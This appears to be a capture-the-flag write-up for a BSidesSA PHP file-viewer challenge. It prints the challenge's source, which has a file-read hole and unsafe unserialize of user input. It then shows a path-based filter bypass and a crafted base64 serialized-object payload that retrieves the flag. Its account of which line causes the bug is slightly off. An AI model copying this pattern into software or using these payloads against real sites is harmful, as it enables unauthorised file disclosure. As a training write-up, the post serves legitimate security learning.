---
layout: post
title: undynamic nosql
---

# Undynamic NoSQL

Upon first viewing of the web page, we get this:

![index](./1.png)

The expected functionality is that the web page will display a file from the drop down list.

![display](./2.png)

## Challenge Begins

The first thing to do was view the page source where the following comments appeared:

```
<!--<option value="flag.txt">flag.txt</option>-->
<!--<option value="index.php">index.php</option>-->
```

Modifying the GET request by changing the filename parameter value in the URL to access index.php showed:

view-source://xx.xx.xx.xx/?filename=index.php

```
<html>
<h1>FileViewer</h1>
<form action="/">
<select name="filename">
<!--<option value=".">.</option>-->
<!--<option value="..">..</option>-->
<option value=".htacccess">.htacccess</option>
<option value="DemoController.cs">DemoController.cs</option>
<option value="factorial.js">factorial.js</option>
<!--<option value="flag.txt">flag.txt</option>-->
<!--<option value="index.php">index.php</option>-->
<option value="main_test.go">main_test.go</option>
<option value="my.log">my.log</option>
<option value="setup.py">setup.py</option>
</select>
<input type="submit" value="submit">
</form>
<p>Want to save your File View? Bookmark this url: <a href="/?view=TzoxMDoiRmlsZVZpZXdlciI6MTp7czo4OiJmaWxlbmFtZSI7czo5OiJpbmRleC5waHAiO30=">Bookmark me!</a></p>
<?php<br />
session_start();<br />
//parse_str(implode('&', array_slice($argv, 1)), $_GET);<br />
?><br />
<html><br />
<h1>FileViewer</h1><br />
<?php<br />
class FileViewer<br />
{<br />
   var $filename = "";<br />
<br />
   function __construct($filename)<br />
   {<br />
      $this->filename = $filename;<br />
   }<br />
<br />
   function __toString()<br />
   {<br />
      if (!empty($this->filename))<br />
      {<br />
         return file_get_contents($this->filename);<br />
      }<br />
      else<br />
      {<br />
         return "No file!";<br />
      }<br />
   }<br />
}<br />
?><br />
<form action="/"><br />
<select name="filename"><br />
<?php<br />
$files = scandir(".");<br />
foreach ($files as $f)<br />
{<br />
   $select_val = "<option value=\"" . $f . "\">" . $f . "</option>";<br />
   if ($f == "." or $f == ".." or $f == "index.php" or $f == "flag.txt")<br />
   {<br />
      $select_val = "<!--" . $select_val . "-->";<br />
   }<br />
   echo $select_val . "\n";<br />
}<br />
?><br />
</select><br />
<input type="submit" value="submit"><br />
</form><br />
<?php<br />
$my_view = NULL;<br />
if (isset($_GET["filename"]) and !empty($_GET["filename"]) and $_GET["filename"] != "flag.txt")<br />
{<br />
   $my_view = new FileViewer($_GET["filename"]);<br />
   $my_view_b64 = base64_encode(serialize($my_view));<br />
   echo '<p>Want to save your File View? Bookmark this url: <a href="/?view=' . $my_view_b64 . '">Bookmark me!</a></p>';<br />
   echo "\n";<br />
}<br />
elseif (isset($_GET["view"]) and !empty($_GET["view"]))<br />
{<br />
   $my_view = unserialize(base64_decode($_GET["view"]));<br />
}<br />
<br />
if (isset($my_view) and !empty($my_view))<br />
{<br />
   echo nl2br($my_view);<br />
}<br />
?><br />
</html><br />
</html>
```

There appeared to be a bug in 

`$select_val = "<option value=\"" . $f . "\">" . $f . "</option>";<br />` 

which did not properly prevent access to index.php and directory traversal.

Thus, the flag was accessible via editing the filename parameter like so: 

xx.xx.xx.xx/?filename=./flag.txt

The less trivial and likely intended method for solving the challenge is demonstrated by the link saving functionality where the parameter is base64 encoded and passed instead.

An example parameter:

xx.xx.xx.xx/?view=TzoxMDoiRmlsZVZpZXdlciI6MTp7czo4OiJmaWxlbmFtZSI7czoxNzoiRGVtb0NvbnRyb2xsZXIuY3MiO30=

Decoding the base64 encoded string showed the parameter in the following format:

`O:10:"FileViewer":1:{s:8:"filename";s:17:"DemoController.cs";}`

This format was used to write a parameter to access flag.txt:

`O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.txt";}`

Encoding it to base64 and passing it to the parameter provided access to the flag:

xx.xx.xx.xx/?view=TzoxMDoiRmlsZVZpZXdlciI6MTp7czo4OiJmaWxlbmFtZSI7czo4OiJmbGFnLnR4dCI7fQ==

BSidesSA{pea_8ch_pea_1s_gr34t}

